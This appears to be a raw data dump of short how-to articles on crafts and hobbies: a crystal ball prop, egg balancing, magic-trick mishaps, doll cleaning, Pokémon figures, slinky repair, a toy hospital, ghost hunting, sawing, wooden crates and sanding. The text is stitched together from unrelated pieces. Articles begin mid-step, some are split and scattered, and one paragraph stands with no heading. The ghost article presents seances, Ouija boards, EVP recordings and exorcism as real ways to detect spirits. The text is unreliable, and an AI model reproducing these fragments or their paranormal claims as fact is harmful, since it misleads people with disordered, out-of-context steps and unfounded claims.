You do not need to do this if you are using a canning jar. You will not be gluing any more lights to the lid.

, Already having applied glue to the light itself, all you need to do is use a small amount of pressure to make sure the glue sticks. The tea-light on the inside should be hanging upside down, while the tea light on the outside will remain right side up.

, Before mounting the globe onto the base, make sure the LED lights are on and working properly. You will need to remove the globe each time you want to turn on or turn off the lights inside your crystal ball.

, Insert the drinking glass and its attached LEDs into the opening of the glass globe until it comes to rest against the dried glue bead. The opening of the drinking glass will now be the base of your crystal ball, which should be glowing from the LED tea lights inside.


If your drinking glass is too small, it will slip all the way into your globe and spoil the effect of a raised, glowing crystal ball.
If you are using a canning jar simply screw the lid into place. The LED tea light will now be hanging on the inside of the jar, surrounded spiderweb cotton.

, This will add to the over-all aesthetic of the crystal ball, and more importantly, conceal the fact that it is a globe resting on an overturned, clear drinking glass.Black and red are classic fortune teller colors, and satin or velvet can give your crystal ball an air of elegance.
If you are using the crystal ball as a Halloween prop, try matching the decorative fabric to your costume.

Try to balance and egg without the salt around an equinox.,
Carefully balance the egg on a hard smooth surface.",How to Balance an Egg3," You can do it about March 20, on the spring equinox, or about September 23, on the autumn equinox. Some people believe that the gravitational pull of the Sun that occurs on the equinoxes can help keep an egg standing on its end. Not surprisingly, those people are wrong. You can balance an egg equally well on any day of the year. However, this makes for a good yarn and a chance to explain scientific methodology over superstition.

, If it doesn't balance, then you can try another method.

Remind yourself at the outset that every magician has made a mistake somewhere.,
Remain calm and avoid panicking.,
Assess the damage quickly.,
Divert the audience's attention.,
Don't give a repeat performance.,
Prepare thoroughly before each performance.",How to Recover from a Bungled Magic Trick," The mark of a good magician is showmanship and solid performance, and part of that is to know how to act and improvise as much as knowing how to perform the tricks. All magicians join the Blundering Magician's Club at some point or other! It's how you react that makes all the difference; ease of recovery and setting the audience at ease.;
, The show must go on. Don't let a mistake cast a pall over the entire performance; the audience will forgive the error provided you remain good-natured and professional about your pick up. The majority of audiences want you to succeed and they want to be entertained; they're not baying for your blood if something trips up. If anything, most people will be very sympathetic, and will marvel at how well you managed the mistake to get on with the rest of the show.


Practice overcoming surprise quickly. Develop a neutral or professional face that is not easily phased by things going wrong. In many cases, provided you maintain your composure and just keep going, many members of the audience won't even catch on that something has gone wrong.
Even if you think that the secret to the trick has been revealed, don't be surprised if many members of the audience didn't register this. Remember that what you see is not what the audience sees.

, If the entire trick has been ruined because the secret to its delivery has been openly revealed, it's probably best to abandon it as ""prop failure"" with a smile and professional wave of the hand. In this case, put away the prop and move on to the next trick. If it's not so bad as that, consider ignoring the mistake and simply keep going. This is the most professional and composed approach to keeping the show going. If the trick has other elements to it that you can continue with because they haven't been ruined, keep going down this path. If, however, the trick itself is spoiled, try the following:


Restarting the trick. Mention something about gremlins and return to the start of the failed trick. Only do this if the secret to the trick was not revealed.
Doing a different trick using the same magic props. This can work well where the mistake has taken place at the beginning of the trick.
Stopping the trick and put it all away and move to the next part of the performance. This is the most useful method when you realize you're missing parts or all of the necessary props, you sense a feeling of anti-climax, or where the secret has been exposed.
If you forget how to do the trick, try to make this less than obvious. Tell the audience there's a ""glitch"" and you're moving on to the next trick. If you remember the trick later, you can always say that the ""glitch appears to have been fixed"" and come back to it.

, Magic is all about diverting attention as part of the entertainment, and when you've made a mistake, diversion should be brought to bear in its fullness. Ways to divert attention include:


One of the most important points of misdirection is not looking at what you are doing. Look at the audience, they follow what you are looking at and if you're not looking at your dirty work, they aren't either.
Talking constantly to the audience about some aspect of magic, or drawing out the suspense while you quickly remedy the problem. If you're really good, point to someone in the audience and ask them a trick question, or even ask them to come down on stage to help with the next trick!

Use humor. Humor is your performance ally. For example, put away the prop as you make a joke, if you make your mistake at the end of the trick. Try saying ""There's nothing like a well-rehearsed magic trick. And that was nothing like a well-rehearsed magic trick"". Then do your next trick.

, Stuffing up once during a show is forgivable. Doing it twice starts to tell the audience you don't know what you're doing and by the third time, they're watching a clown, not a magician. While it's a tall order, spend a lot of time learning to maintain composure on the stage and you will be able to recover well and keep your confidence to continue without making any further mistakes.


If you keep stuffing up the same trick, this means there is something amiss with it. Pull it out of your repertoire until you figure out how to do it flawlessly; if not, drop it altogether.

, An important part of ensuring that things don't go wrong during a performance is to prepare thoroughly beforehand. Practice the tricks repeatedly, triple check that all your equipment is in working order, and make repairs to anything that is faulty or suspect.


Seek help from a fellow but more experienced magician if you're not sure how to fix a magic challenge or extend your ability further. Instead of using your audience as the guinea pig and potentially failing in the process, training with someone more experienced can help reveal your weaker spots and allow you to perfect them before undertaking a live performance.
If you're a beginner magician, approach each magic performance with confidence. If you worry too much about missing the trick or messing it up, you may just be setting yourself up to do that very thing! Go in with a feeling that you're ready to show your well-rehearsed skills and be confident when performing.
Watch failed magic tricks in online videos. There are plenty of them available; what they will teach you is what not to do, what reactions are good or bad, what to keep in mind when performing certain tricks, and possibly, which tricks to avoid altogether!

Prepare the doll for cleaning.,
Choose one or more of the following methods.",How to Clean Marker off a Doll1,"

Check that the doll is suitable for cleaning. The doll must be a modern, plastic or vinyl based doll. Vintage, valuable and older dolls are better seen by a professional doll repairer.
Remove the doll's clothing, shoes and any accessories.
Pull the doll's hair back, if possible, and either pin it up or put it in a ponytail with a hair elastic.
Protect the eyes and original painted areas if needed. For example, bandage off the eyes to protect them from cleaning solution being rubbed or splashed into them.

, They are not provided in any specific order. However, it is important to understand that markers are made of different ink and solvent combinations, so not every method is going to be spot on. To test the likely usefulness of a method, you can do a test with cotton swabs as follows:

Choose as many of the solutions suggested below as you have ingredients for.
Dip a cotton swab in the solution.
Rub on a small part of the stained area.
Look at all of the swabs. The one which has transferred the most color is likely to be the best solution for the marker on your doll.

Another famous way for making an egg stand on end is the Columbus method.",How to Balance an Egg5," There is a popular story of how Christopher Columbus, having been told that discovering the Americas was no great accomplishment, challenged his critics to make an egg stand on its tip; and, after they gave up, he did it himself by tapping the egg on the table so as to flatten its tip. This may ruin your egg a bit, though. Once again, it's a good yarn.

Display the Pokémon figure carefully.,
Keep the Pokémon figure clean.,
Store the Pokémon properly.,
Keep all the items that relate to the figure.,
Make a house for your Pokémon figure.,
Play battles with your Pokémon figure.,
Give it a nickname.,
Have fun with your Pokémon.",How to Take Care of a Pokemon Figure," Choose a good place for keeping the Pokémon on display where it is easily seen and enjoyed. There are some things to watch out for, and these include:


Try to keep the figure at eye level, so that it's easy to spot.
Do not place it in direct sunlight. Over time, this will fade the colors and may cause the materials to become brittle.
Do not place the figure near direct heat. It may melt or become misshapen.
Choose a place where it won't be taken by younger siblings or pets. Younger children may play with it roughly, while pets may leave teeth or claw marks on it.;
, If the Pokémon figure gets dusty, simply wipe off the dust with a damp cleaning cloth or use a feather duster. If the Pokémon gets dirty, use a simple solution of warm soapy water and a soft dish sponge to wipe marks off it.


If the figure gets a stain on it, work out what sort of stain it is, then look up a remedy for that type of stain, on plastic/vinyl figures.

, If you're not going to be displaying or playing with your Pokémon figure, keep it in a safe place out of harm's way. Put it inside a container or storage box, wrapped in tissue paper. Keep it away from sharp objects that might mark it. Also be careful not to store it next to anything that might leak onto the figure and stain it, such as markers or nail polish. As with displaying the figure, keep it stored away from heat. A cool, dry environment is the best bet.


If storing a set of Pokémon figures, reserve a shoebox or similar small box to put them all in. Line it with soft foam and tissue paper, then wrap the figures individually in tissue paper. Carefully arrange them in the box. Add the lid, to keep the dust off. Store as above.

, In terms of keeping its value, you might like to keep any cards, instructions, packaging and related items for future purposes. The figure isn't worth much now but in 50 years time, when there are less of them around, someone might be keen for a Pokémon figure with all of its related items.

, Build a little house from a box, a recycled plastic bottle, a yogurt bottle or similar small items. Be sure to include windows and a door, and some furniture inside, such as a bed for the Pokémon to sleep on.


If you have more than one figure, make a village for them.

, If you, your friends, or family have any Pokémon figures, challenge them to battle! Pick your Pokémon's moves to use in battle, acknowledging that there is a limit of four moves a Pokémon can know at any one time, so choose wisely!


Also match the moves with the types. A Kangaskhan can't know razor shell, for example.

, If you have a lot of the same Pokémon figures, or you simply can't pronounce or remember its original name, you can give it a nickname.

, That's the best part! You could:


Give it a birthday
Watch its favorite shows together
Give it gifts for Christmas or Hanukkah (whatever you celebrate)
Include it in special occasions
Take it on vacations
Let it have ""playdates"" with your friend's Pokémon.

The problem with applying heat is that it will affect the plasticizer, causing it to break down and with it, removing the pigment in the vinyl or plastic. Moreover, heat combined with the cream can burn the vinyl or plastic. Do this with great caution––it may speed the process up but it can also ruin the doll., Reapply a new layer, with more cellophane over it.After a few weeks, the marks should have faded off considerably and possibly completely.

Rotate the slinky at severe bends.,
Repeat until untangled.,
Switch to the other end if necessary.",How to Fix a Slinky1," Locate the least tangled end of the slinky and put four of your fingers through its center. Keep your thumb on the outside of the loop, so you can grip the end of the slinky and hold it in place.Extra-long slinkies might be easier to untangle if you keep the ""good"" part over your arm, or over a cardboard paper towel tube.;
, Run your first finger and thumb along the slinky, approaching the first tangled area next to the end you're holding. The ""good"" end of the slinky will collect in a neat stack around your fingers.

, Slow down as you approach the tangled area and look closely, so you can see exactly where the slinky goes next. Pull the Slinky's tangled area apart if necessary to get a better view.

, Take the ""good"" slinky off your hand, and hold it so it stays in a neat stack. Turn the stack at an angle and fit it through a gap in the next tangle, so it joins the next length of slinky where your finger and thumb followed it. Once it's through, put the neat stack back on your fingers.


Sometimes, it's easier to hold the stack in place and lift the next loop of the tangle over and around the end of the stack., If you notice a part of the slinky that's bending in completely the wrong direction, or even looks like its about to snap, try rotating the two tangled areas that are crossing each other. Once the area is under less pressure, you can safely pull apart a gap and move the neat end of the slinky through it, as described above.

, Continue following the slinky and collecting it on your hand. Whenever you see a tangle, use the techniques above to get through it.

, If you're untangling a long or extra-tangled slinky, at some point it might get too long to easily move through the gap. At this point, you can carefully set down the part you've already untangled, and switch to the other end of the slinky. Repeat the steps above until the entire slinky is untangled.

",How to Start a Toy Hospital," Maybe the living room, or the playroom? Or maybe you would want it in the privacy of your own bedroom? The choice is yours.;
, Place the boxes in a neat row on the floor. Be careful where you put them, as you don't want people tripping over them. Then, fill the wash basin with warm water, and put it on a table. Lay some tea towels beside it.

, Put the patients in the boxes. This will be their hospital beds. Put some bedding in the boxes to make sure your patients are comfy. Don't put one toy each in one bed, it'll take up more space.

, Try to choose the one who looks the worst. If one doesn't look too bad and can wait a while, don't pick him/her.

, Put the toy into the basin and gently scrub him/her with a soft sponge. If it's a teddy your washing, take out the stuffing first.

, If it's a doll you're drying, brush her hair first, The knots come out easier when her hair is wet. But if it's a teddy, wrap him/her up in a tea towel and place him/her on the floor. Then, gently stand on him/her. He/she won't mind.

, You can do this by shredding a line out of a piece of paper, writing his/her name on it, and tying it to his/hers wrist or ankle. Your toy doesn't have a name? Go to ""How to Name a Teddy Bear"" or ""How to Name a Stuffed Animal or Toy"". Both of them are on wikiHow! (Laminate it to give the bracelet that shiny hospital look).

, What is wrong with him/her? Is it something obvious, or something horribly wrong but you just can't put your finger on it? Here are some simple cures for some common toys:


Barbies, BabyBorns, and other plastic dolls: Missing arms and legs are common among plastic dolls. Look EVERYWHERE for the missing piece -you never know where it might pop up. Sadly, if you can't find the missing piece, this symptom cannot be cured.
Teddies, Bears, and other stuffed animals: Saggy teddies are common but easy to be dealt with. Simply take out the stuffing, and replace it with new stuffing. For missing eyes, sew new ones on. Buttons look a bit creepy, so if your teddy isn't goth or emo, don't use them.
Zhu zhu pets, Furby, RC, and other robot toys: Are you completely sure that your toy is broken? It might just need a change of battery. WARNING: NEVER WASH YOUR ROBOT TOY.

, Get a notebook and pen and write down the hospital records of every patient, what was wrong with them, and how you cured them. And if you like, you could get a friend to help you run the hospital. Sort of an assistance nurse, but you don't have to.

Commission an exorcism.",How to Find Ghosts in Your House," If you suspect that your home is host to an otherworldly being, take the direct approach and attempt to speak to them. Ask them who they were, what they want and why their spirit is trapped in your home. While a ghost is unlikely to engage you in conversation, you may receive signs of its presence in other ways, such as doors opening or closing on their own, or manipulation of the environment that provides clues to what the ghost’s intentions are.Some good questions you might ask are “what is your name?” “why are you here?” “what do you want?” and “how did you die?”
Be sure you can handle a reply before you start asking questions.;
, Though it’s often thought of as a silly toy or gimmick, the Ouija board has long been used to establish a connection to parts unknown. Have a friend join you in trying to make contact with the other side. First, each of you will place both hands on the wooden planchette. Then, you will pose questions for the ghost and await its response. If you feel the planchette begin to move, it may mean the ghost is trying to tell you something.The ghost can answer “yes” or “no” by sliding the planchette over the words, while the individual letters on the board can be used to spell out more articulate responses.
Take it seriously. Don’t cheat by moving the planchette on your own, and ask your friend to do the same. You’ll never know whether you have a true haunting if you play around.

, Assuming you’re reasonably sure that your house is haunted, the next step is to carry out a seance. Seances are ceremonies used to invite the dead to speak to the living. To perform a seance, you must gather with other believers around someone who is receptive to spiritual energies. A seance is a more formal method of contacting ghosts than simply attempting to speak with them. They are most effective when led by an experienced spiritualist or medium.Lower the lights, join hands and sit in silence while you wait for a ghost to show itself.
In order for a seance to be effective, skeptics should be asked to leave the room. Spiritualists claim that their negative attitudes act as a distraction and make spirits reluctant to interact.

, Sometimes, ghost visitations occur in dreams, where it is said that the wall separating our world from the next is most permeable. When you have vivid, unsettling dreams, write down what you saw and experienced in them. Encountering people you don’t recognize or receiving cryptic messages in your dreams could be a spirit’s way of reaching out to you.If you’re stumped about the meaning of a dream, consult with a spirit medium. These experts are commonly trained in dream analysis in addition to their other talents.

, Take notice of bizarre things that happen around you. This could include anything from thinking you saw something moving out of the corner of your eye or heard a whisper when you’re alone to witnessing appliances turn on and off on their own. When hunting for ghost activity, your first line of research should be your own senses and intuition.Investigate as soon as you see, hear or feel something so you’ll have a better chance of catching paranormal events in the act.
Don’t be fooled into believing that every bump or rattle is a ghost. The explanation may be a creaky floor, a draft, a playful pet or just your imagination.

, Once every few days, take a picture of each room of your home. Frame the photo so that you can see as much of the room as possible. Some theories hold that ghosts exist as a kind of residual energy, and that it’s possible to capture a snapshot of this energy under the right conditions.Some signs to look for in photographs are strange lights or orbs, shadowy smudges and streaks of a pale, smoke-like vapors.To avoid confusion, make sure that the lens of your camera is clean and that there isn’t a glare in the room.
Concentrate on rooms where the most phenomena has occurred.

, Like with ghost photography, spirits have been known to appear on video. Set up a camcorder in the areas of your house where you feel the presence most strongly. With a video, you’re essentially taking 24-30 pictures per second, which will increase your chances of spotting an evasive ghost if you look closely enough.Be on the lookout for anything out of the ordinary in the video, especially odd disturbances and hints of movement.
A ghost may only appear on film for a split second. To be sure of what you’ve seen, it may be necessary to pause the footage often or run through some segments frame-by-frame.

, Run an audio recorder while questioning a possible ghost, then play back the recording later and see if it contains any sounds you didn’t hear it person. EVP, or electronic voice phenomenon, describes ghostly voices that are caught on tape. These voices are usually discovered at extremely low frequencies, which means the human ear can’t detect them, but sophisticated audio equipment can.Due to these low frequencies, you’ll probably have to turn your recording device up quite loud in order to hear any voices its picked up.
Write down any words or phrases you hear that are clear enough to interpret. If you’re lucky, you may be able to decipher a message and discover the source of the ghost’s unrest.

, If you feel like you’re in over your head, consider getting in touch with a local paranormal investigation group. The members of these groups are usually supernatural and occult enthusiasts with a good deal of knowledge about ghost history, folklore, science and myth. They will be able to offer expertise, equipment and other resources that can help you in your search.Be sure to provide an in-depth description of the phenomena you've been experiencing so that the paranormal expert can determine whether or not they'll be able to help.
Working alongside a specialist can take away some of the fear of looking into ghost activity on your own. A good paranormal investigator will also know the best way to question and deal with a spirit that is reluctant to move on.

, A ghost that is inhabiting your home most likely doesn’t want to hurt you. In life, they were normal people, just like yourself. With this in mind, it may be possible for you to live with a ghostly presence without feeling the need to get rid of it. The spirit may believe that your home is still its own—activity that is frightening to you are just the essence of the deceased reenacting the events of its daily life.Incidents of ghosts actually harming people are rare. When activity is observed, it’s usually in the form of minor disturbances.
If you believe in ghosts, then you know they can be almost anywhere. It shouldn’t come as a surprise that one or two may occasionally make themselves known in your home.

, Burning the leaves of the sage plant is said to purify the air in your home and cleanse it of negative and evil influences. This may serve you well if you fear that the entity residing in your home is a malevolent one. Take a bundle of dried white sage and let it smolder as you walk through the various rooms of your house, focusing your mind on bringing peace to your surroundings. Burning herbs like sage can pacify restless spirits and help you feel relaxed.Sage has long been used as a medicinal herb, and is believed to offer protection for both the body and soul.Use sage in conjunction with sprinkling holy water, asking prayers for protection and requesting that the spirit pass on., During a seance or solitary communication, gently demand that the lingering spirit depart from your home. Ghosts are often understood to have “unfinished business” that keeps them tethered to a certain place. Put your unearthly visitor at ease and inform them that there’s nothing they can do by staying. Hopefully, they’ll understand and be able to move on to a new, peaceful plane of existence.In a compassionate but firm voice, ask the ghost to leave. Use entreaties like ""this is my home now—you have no business here,"" or ""don't be afraid to pass on. There is no longer a reason for you to stay.""
It may help to know some details of the suspected ghost’s former life in order to connect with them and guide them onward.Try not to take a hostile tone. An angered ghost may become vengeful.

, If you’re being plagued by wicked, mischievous or disruptive ghosts, there may come a time when enough is enough. In this case, an exorcism may be necessary. Seek out a Church official qualified to perform a proper exorcism and ask them to visit your home to get a sense of the spirit’s power and intent. A well-trained exorcist will know the right invocations and ritual practices to successfully dispel spectral intruders.Usually, an exorcist will be a member of the Catholic clergy who has received special education in dealing with supernatural forces. However, other religious orientations also have priests and shamans who are capable of conducting exorcisms.You may be asked to leave or remain in the house during the exorcism, depending on the exorcist’s methods.

Pull the two ends of the slinky apart.,
Rotate one end of the slinky.,
Lift the tangled loops up to fix them.",How to Fix a Slinky2," Hold both ends of the slinky, one in each hand. Pull them apart in opposite directions, just enough that you can see exactly where the tangle is. Keep holding them in that position.


This method is for slinkies with only a few of its loops tangled. If your slinky is too tangled to form a straight line when pulled apart, you can try this with just one small section of the slinky, or switch to the extremely tangled slinky method instead.

, Hold the other end steady as you rotate. Rotating in one direction will make the tangled loops move farther apart; this is the direction you want. If you start rotating and the tangled loops grate tightly together, stop and reverse the direction you're rotating.

, Once the tangled loops have some space between them, look closely to see which loop is out of place. Lift that loop up away from the straight line of the slinky. If you keep the slinky stretched apart, the loop should snap back into the correct place as soon as you let go. If it doesn't, pick it up again and guide it carefully back between the right loops, rotating if necessary.


This step is easier if you ask a friend to hold one end of the slinky while you do this.

Know your chances for plastic or metal slinkies.,
Heat a pot of water.,
Turn off the heat.,
While wearing gloves, put the slinky into the hot water.,
Remove the slinky and bend it into place.,
Try again with hotter water if you didn't succeed.,
Press the slinky flat with a book.,
Heat the slinky in an oven.,
Cut the slinky apart.",How to Fix a Slinky3," This method is for slinkies that aren't tangled, but have developed bent coils or ""kinks"" that refuse to line up with the other coils. Some plastic slinky kinks can be molded back into place when heated, but this won't always work and could even melt your toy if you're not careful. Metal slinkies are much harder to bend back, so only try it if you have time to spare and really don't want to buy a replacement.

, Fill a pot with enough water to cover the slinky. Heat it on the stove alone, without the slinky in it.You do not want the water to boil, but keep heating it until it becomes quite hot, perhaps just beginning to steam.


You could microwave a bowl of water instead, or heat water in the kettle and pour it into a pot.

, Turn off the heat once the water is hot. Never keep heating the water after the slinky is in it, or the slinky could melt and ruin both itself and the container it's in.

, Put on rubber gloves to protect your hands, and lower the slinky into the hot water. Leave it there for a couple minutes.

, After a couple minutes in the hot water, take the slinky out while wearing gloves. If the slinky was heated hot enough, you should be able to mold it gently into place, pressing the kinked coil down where it should go.


If you have a cardboard tube or other cylinder that's slightly smaller than the slinky, you can wrap the slinky coils around it to get the right position., If the slinky is still stiff and can't be bent, heat the water hotter and try again. Heating the slinky too much can make it a permanently ruined mess, so increase the temperature slowly and keep a close eye on the water. Never heat the slinky directly.

, Immediately after bending it back into place, place the coiled slinky underneath a flat book. Leave it there for several hours, or even overnight, to compress the slinky into position.


If the book keeps falling off, try using a large, thin children's book instead. Place a small, heavy object on the center of the children's book, directly over the slinky.
Don't use a book that's so heavy or so wide that it knocks the slinky over and crushes it.

, If hot water doesn't work to repair the slinky, you could line a baking sheet with tin foil, put the kinked slinky in a stack on top of it and heat it in a 250ºF (121ºC) oven for about 10 minutes.Use oven mitts to pull it out and bend it back into place, if it hasn't settled on its own. This is risky, as some plastic slinkies could melt.

, If all else fails, use a pair of wire cutters to cut the slinky at either end of the kink. You can try to reattach the good parts using rubber cement or super glue, but it will be difficult to attach them at the right angle. More likely, you'll end up with two permanently separated smaller slinkies.


The cut ends may be sharp. Try covering them with several small pieces of packing tape to protect your fingers.

Support the wood at a comfortable level.,
Wrap all of your fingers and thumb around the saw handle, except for your index finger.,
Saw with a fair amount of pressure when pushing forward, and use little to none when pulling back.,
Use more length of the blade when the cut gets deeper.,
Use the blade's reflection to guide a perpendicular cut.,
Check for a dull blade.",How to Saw Lumber1," Use a table or sawhorse and align your body over the workpiece.;
, Place your index finger on the side of the handle, pointing down the blade, to serve as a guide.

, Don't use too much pressure.

, Once you're about 1/2 inch (13 mm) into the wood, increase the length of your strokes. Shorten the strokes once more toward the end of the cut.

, When making a square crosscut, place the saw at the edge of the wood, and line up the actual edge of the wood with the reflection of that edge on the saw blade.

, If using your handsaw requires a lot of strain, and it's difficult to make a clean cut, hold the blade up to the light. If the tips of the teeth reflect light, sharpen the saw.

Set the blade depth.,
Support only one side of a board when sawing crosswise.,

Support both ends when sawing wide pieces of plywood.,
Cut at an angle by holding up the blade guard at the beginning of a cut.,
Practice sawing in a straight line.",How to Saw Lumber2,"


Retract the blade guard and place the unplugged saw blade next to the wood piece.
Use the adjustment lever or knob to set the blade 1/4 to 1/2 inches (6 to 13 mm) below the wood.

, Let the piece you are cutting off fall freely from the unsupported end. Restricting it will affect the cut.

, You can do this by nailing the board to the sawhorses.


Use a combination square and pencil to mark your cut.
Start the saw 1 inch (2.5 cm) from the wood and guide the saw along the line, pinching the shoe of the saw between your thumb and forefinger. Keep your fingers as far away from the cut line as possible.

,


Place 2 2-by-4s across the sawhorses to keep the plywood from splintering when you finish the cut.

, The guard can catch on the wood if you leave it down during angled cuts. When you've cut a few inches into the wood, lower the guard and finish the cut.

, If your cut goes crooked when sawing, don't try to straighten it out. Stop sawing and start again along the line.

Finished.

",How to Saw Wood With a Handsaw," Leave plenty of space to work around the wood. Woodworking clamps can be purchased at hardware stores. Attach the clamps to the wood and the surface that the wood is resting on before beginning.;
, Use a tape measure to determine the size of the wood, and where it needs to be cut. With a pencil and a square, draw a line across the wood, indicating how and where you will cut the wood.

If you are a beginner, continue the line all around the workpiece so that you have a better guide and an idea of how straight your cut is.







, The saw doesn't cut along a one dimensional line, it cuts a path of about 1 to 2 millimeters. It is necessary to take this into account or the end result will be a few millimeters too short or too long. Angle the far edge of the handsaw down towards the ground, and slightly raise the elbow that is holding the saw.

, The grip should be firm but relaxed.

Avoid having a rigid posture as this will make using the saw more difficult.
Do not hold it too tightly, or it will be difficult to move the saw.
Do not hold it too loosely or the saw will be difficult to control and keep on the line.







, The hand that is not holding the saw should rest on the piece of wood in order to keep it still and secure. Be sure to keep that hand a good distance from the saw to prevent an accident.

, Use another piece of wood to keep the saw from moving away from the line if necessary. Once the saw has made a slight cut into the wood, check that you're cutting in the right direction and at the right angle., Lightly press down on the saw and keep cutting through the wood. Try applying less or more pressure onto the saw to find the right balance of force. Your sawing motion should be smooth and accurate. Slowly move the saw back and forth, towards the body and away from it. Stop after every few motions to level the saw on the cutline, and make sure that the cut is straight.

, Slow down and apply less force towards the end, to avoid cracking or splintering the wood. Hold on to the piece that you're about to cut off to prevent the weight of the wood from breaking off in splinters.

Make simple shelving.,
Stack crates to make a cheap nightstand.,
Add a custom desk to your office.,
Fill wooden crates with soil to make planters.,
Hold your party favors in rustic crates.",How to Reuse Wooden Crates in Your Home1," Wooden crates with cracks or holes on their smallest sides are best for this project. Pass a rope through the crate’s small sides, so that it rests against the top of the crate. Install a hook on your wall and hang the crate onto it.

If the crate you’re using doesn’t have holes, you can drill them into the sides.;
, This project doesn’t require much work. Simply find three wooden crates and stack them next to your bed. They don’t have to be stacked perfectly, in fact offsetting them a bit will give the nightstand a better look.

You can stain or paint the wooden crates to better fit with your decor. Make sure to do so before stacking the crates or placing them in the bedroom., Not only will this upgrade the look of your office, it also allows you to build a desk fitting your height. All you’ll need are a few crates and a board, ideally made of plywood. Stack crates up to your desired height at either end. Use nails or screws to secure each stack of crates together, then place your plywood board atop them.You can use mending plates to secure the crates together if you’re worried about the wood splitting.

, Some crates will work better as planters than others. You need to ensure there’s proper drainage so water can flow through, but soil won’t fall out. If the bottom of your crate is completely solid, you can drill holes in it, then cover the bottom with a piece of burlap. This will let water go through, but keep the soil in the crate., This project doesn’t require much work beyond decoration. You may want to start with staining the crates or giving them a coat of paint. Depending on the party, you might then use stencils or other paints to decorate the crates. For instance, if the crates are used for a wedding, stenciling or painting on the names of the bride and groom is a must.Make sure to wash the crate with soapy water if it’s going to come into contact with food.

Select a type of wood that is suitable for quarter sawing.,
Determine what size log is needed to yield the right size of boards.,
Look at the characteristics of the log to tell if it is going to produce good quarter sawn lumber.,
Cut the log into quarters.

,
Remove the portions of the log that are not good for woodworking.,
Run one side of each quarter over a jointer to get it flat and smooth.

,
Place each quartered section on the saw carriage, which holds the log while it is being sawn, so that the annual rings of growth are between 75 and 90 degrees to the face of the resulting boards.

,
Saw the quarters so that the rays are perpendicular to the face of the board.",How to Quarter Saw,"


Oak is probably the most popular quarter sawn timber. The ray flecks that oak reveals when it is quarter sawn are spectacular.
Maple is another wood that displays an attractive appearance when it is quarter sawn.;
, A 12-inch (30 cm) log will give you only a 4- to 5-inch (10 to 12.5 cm) sawn board at the widest.

,


The bark should be straight so the medullary rays are running straight to the middle of the tree from the outside. These rays are the ribbons that extend vertically through the tree perpendicular to the growth rings and which appear shiny.
The rays at the end of the log should appear to be in a spoke-like pattern from the center. The longer and thicker they are, the more chance you have of hitting them when you saw.

,,


Split out the pith (the soft spongy part located in the center of the log).
If possible, remove the sapwood, which is the outer, lighter-colored wood. This is the part of the tree where water and sap flows. It contains moisture and will shrink when it dries. It also is more susceptible to fungus.

,,, When you quarter saw, the saw actually splits the medullary ray. A quarter sawn board shows the annual rings mostly at right angles to the surface of the board, whereas a plain sawn board has rings aligned to the surface.

Cut handles into the side panels.,
Flip the wooden crate upside down and screw on four wheels.,
Sand down the crate with sandpaper.,
Vacuum up the wood dust.,
Decorate your cart creatively.",How to Reuse Wooden Crates in Your Home2," Start by drawing rectangles on either side of the crates with a pencil, near the top of the shortest sides. The handles shouldn’t be much wider than a third of the width of your crate. Use a jigsaw to cut out the handles, following your pencil lines.

If the crates you have already have handles cut into them, you can skip this step., You’ll need to get casters, which are small wheels specifically for furniture and crates. The wheels are attached to a small metal plate with holes, designed to be screwed into another object. You’ll want to use a drill to screw the wheels into the bottom of the crate, one for each corner., Make sure to follow the grain as you sand. You shouldn’t need to sand down finer than #180 grit. This will make sure the crates are smooth enough for you to handle if you need to cart them around., Use a brush attachment with soft bristles. This will ensure you’re not scratching the crate, and the bristles will pick up the wood dust more effectively than other attachments., Your options here are nearly limitless. You can use stencils and spray paint to write on the cart. This can be useful for writing a child’s name or labeling the cart with a word reflecting its contents. Alternatively, you can use paints to decorate the cart."

Paint or stain the crates.,
Lay the crates down, bottoms up.,
Place mending plates where the crates come together.,
Use a drill to screw in the mending plates.,
Stand the bookshelf upright carefully.",How to Reuse Wooden Crates in Your Home3," Depending on the look you’re going for, you’ll either want to paint or stain the crates. If you want the crates to keep their wooden look, you’ll want to stain the wood. If you want your bookshelf to be brightly colored, you’ll want to paint the crates.

Before building the bookshelf, you should let the crates dry. This can take several hours., You should lay them so they’re touching each other, arranged in the shape of the bookshelf you’re looking to build. Only the crates should be pointing away from you, the opening touching the floor.

The simplest method is to stack three or four crates together in a straight line, but you can experiment with different layouts., Mending plates are rectangular metal parts with two holes on either side. They’ll secure your crates together. Put the mending plates perpendicular to each juncture, using two for each. Place them about an inch (2.5cm) away from the edge of the crate., If you’re using a softer wood, like pine, you may want to predrill your holes. Otherwise, just use half-inch (1.3cm) screws to fasten the mending plates to the crates., Since the crates are only secured by mending plates in the back, simply pulling up will cause the crates to come apart. Instead, flip the bookshelf over to its side. Hold the upper and lower crates carefully, exerting enough pressure to hold the crates together tightly. Then tip the bookshelf up until it’s standing upright."

Use a disk sander with an adjustable angle to sand the ends of your work pieces (boards) until the ""fit"" is acceptable.,
Get a random orbital disk sander to sand your finished product, or use a sanding block sanding.,
Begin with a suitable sandpaper grit.,
Sand in the direction the grain is running.,
Apply stain, paint, or sanding sealer, and allow to dry.",How to Sand Compound Joints," The purpose of this step is to assure a very close, tight fit in the ends of two boards cut on a compound angle, such as crown moulding or a shadow box picture frame. If you do not have access to a disk sander, you may fashion a sanding block by stapling a piece of medium grit sandpaper to a block of wood. The sanding process needs to be done in a flat manner to get a good fit.


Begin with the two boards an eighth of an inch or so longer than you need them, cut with a miter saw, or a little longer still if cut with a circular saw, since the cut will not be as precise.
Hold the two boards together at the correct angle for the finished fit, and scribe or mark any portion of the joint that is ""long"", or interferes with an overall fit.
Mark the long portion of the cut end with a sharp pencil, doing so very lightly if the finished product will be natural finish.
Using the disk sander, position the table to support the work at the correct angle parallel to the mark. Sand in uniform passes, checking the two pieces for fit frequently.
When the fit is ""close enough"", or satisfactory, fasten the pieces together. Some assemblies may use corrugated fasteners, or you may chose finish nails, wood screws, or glue. If you are equipped, you may wish to biscuit or dowel the joint, so it is very strong with no visible fasteners.;
, This will assure the sandpaper rests flat against the surface you are sanding.

, If you are working finished (wood which has been planed with a planer to a flat, smooth, finished surface) you will only have to sand splintering at the cuts, and sanding to fit the joint. On the other hand, for rough sawn wood, you will want to begin with a coarse grit paper, about 100 grit, and work your way up in grit (150grit, then possibly 200 or 220 grit) until the surface is smooth enough to stain, seal, or paint.

, This is where a compound joint gets tricky, but sanding across, or perpendicular, to the grain will cause the grain to ""raise"", or fluff up, making your job finishing the piece more difficult. With the random orbital sander, the sanding will be much smoother, and grain direction is not nearly so important.

